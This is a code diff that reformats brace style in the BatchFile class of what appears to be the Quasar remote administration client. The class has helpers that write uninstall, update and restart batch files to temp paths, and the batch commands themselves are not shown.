@@ -3,20 +3,16 @@ using System;
 using System.IO;
 using System.Text;
 
-namespace Quasar.Client.IO
-{
-    public class BatchFile
-    {
+namespace Quasar.Client.IO {
+    public class BatchFile {
         /// <summary>
         /// Creates the uninstall batch file.
         /// </summary>
         /// <param name="currentFilePath">The current file path of the client.</param>
         /// <param name="logDirectory">The log directory.</param>
         /// <returns>The file path to the batch file which can then get executed. Returns <code>string.Empty</code> on failure.</returns>
-        public static string CreateUninstallBatch(string currentFilePath, string logDirectory)
-        {
-            try
-            {
+        public static string CreateUninstallBatch(string currentFilePath, string logDirectory) {
+            try {
                 string batchFile = FileHelper.GetTempFilePath(".bat");
 
                 string uninstallBatch =
@@ -30,9 +26,7 @@ namespace Quasar.Client.IO
 
                 File.WriteAllText(batchFile, uninstallBatch, new UTF8Encoding(false));
                 return batchFile;
-            }
-            catch (Exception)
-            {
+            } catch (Exception) {
                 return string.Empty;
             }
         }
@@ -43,10 +37,8 @@ namespace Quasar.Client.IO
         /// <param name="currentFilePath">The current file path of the client.</param>
         /// <param name="newFilePath">The new file path of the client.</param>
         /// <returns>The file path to the batch file which can then get executed. Returns <code>string.Empty</code> on failure.</returns>
-        public static string CreateUpdateBatch(string currentFilePath, string newFilePath)
-        {
-            try
-            {
+        public static string CreateUpdateBatch(string currentFilePath, string newFilePath) {
+            try {
                 string batchFile = FileHelper.GetTempFilePath(".bat");
 
                 string updateBatch =
@@ -61,9 +53,7 @@ namespace Quasar.Client.IO
 
                 File.WriteAllText(batchFile, updateBatch, new UTF8Encoding(false));
                 return batchFile;
-            }
-            catch (Exception)
-            {
+            } catch (Exception) {
                 return string.Empty;
             }
         }
@@ -73,10 +63,8 @@ namespace Quasar.Client.IO
         /// </summary>
         /// <param name="currentFilePath">The current file path of the client.</param>
         /// <returns>The file path to the batch file which can then get executed. Returns <code>string.Empty</code> on failure.</returns>
-        public static string CreateRestartBatch(string currentFilePath)
-        {
-            try
-            {
+        public static string CreateRestartBatch(string currentFilePath) {
+            try {
                 string batchFile = FileHelper.GetTempFilePath(".bat");
 
                 string restartBatch =
@@ -90,9 +78,7 @@ namespace Quasar.Client.IO
                 File.WriteAllText(batchFile, restartBatch, new UTF8Encoding(false));
 
                 return batchFile;
-            }
-            catch (Exception)
-            {
+            } catch (Exception) {
                 return string.Empty;
             }
         }
